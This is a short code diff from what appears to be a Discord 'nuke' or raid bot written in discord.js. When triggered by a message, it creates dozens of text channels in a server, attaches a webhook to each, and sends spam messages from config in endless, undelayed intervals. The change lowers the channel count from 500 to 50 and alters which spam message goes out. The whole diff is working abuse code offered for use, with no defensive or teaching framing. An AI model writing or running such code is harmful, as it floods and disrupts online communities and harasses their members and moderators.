@@ -64,17 +64,16 @@ client.on('messageCreate', async message => {
       }
     }
      
-    for(let i = 0; i < 500; i++){
+    for(let s = 0; s < 50; s++){
       await guild.channels.create(config.ch, {type: 'GUILD_TEXT'}).then((c) => {c.createWebhook(config.webhookname, {
         avatar: config.webhookpfp
         }).then(async webhook =>{setInterval(() => {
           c.send(config.spamsg);
-          webhook.send(config.spamsg)
+          webhook.send(config.spamsg2)
         })
       })
     })
-    setInterval(() => {guild.channels.cache.filter(c => c.isText()).forEach(c => c.send(config.spamsg2))});
-  } 
+} //end of the for loop 
 };
 };
 });
